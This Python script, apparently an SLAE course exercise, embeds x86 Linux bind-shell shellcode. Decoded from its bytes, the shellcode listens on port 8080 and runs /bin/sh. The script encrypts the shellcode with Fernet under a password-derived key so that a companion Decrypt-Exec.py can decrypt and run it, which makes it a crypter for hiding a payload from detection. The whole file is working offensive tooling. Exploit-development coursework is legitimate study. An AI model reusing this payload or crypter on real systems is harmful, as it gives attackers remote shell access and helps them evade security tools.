########################################
# Filename: Encrypt.py
# Author  : Andrea Perfetti
# SLAE ID : SLAE - 1547
#:::::::::::::::::::::::::::::::::::::::
# USAGE
# Add your shellcode in the 'shellcode' variable following the example
# then run the script to get the encoded version.
# Copy it into Decrypt-Exec.py and follow related instructions.
########################################

import string
import random

import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


# Update here the shellcode to be encrypted
shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x89\xe2\x50\x50\x50\x66\x68\x1f\x90\x66\x6a\x02\x66\xb8\x69\x01\x89\xfb\x89\xe1\x29\xca\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\xcd\x80\x89\xc6\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\x40\xcd\x80"

salt = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))

plain_pwd = input("Enter the password: ")

kdf = PBKDF2HMAC(
	algorithm = hashes.SHA256(),
	length = 32,
	salt = salt.encode(),
	iterations = 1000,
)
key = base64.urlsafe_b64encode(kdf.derive(plain_pwd.encode()))

cipher_suite = Fernet(key)
cipher_text = cipher_suite.encrypt(shellcode)

encrypted_payload = salt.encode() + cipher_text

print ("--------------------------------------------------------")
print ("Chosen password: ", plain_pwd)
print ("")
print ("--------------------------------------------------------")
print ("Random salt: ", salt)
print ("")
print ("--------------------------------------------------------")
print ("Encrypted payload: ")
print ("")
print (encrypted_payload)
print ("")
print ("--------------------------------------------------------")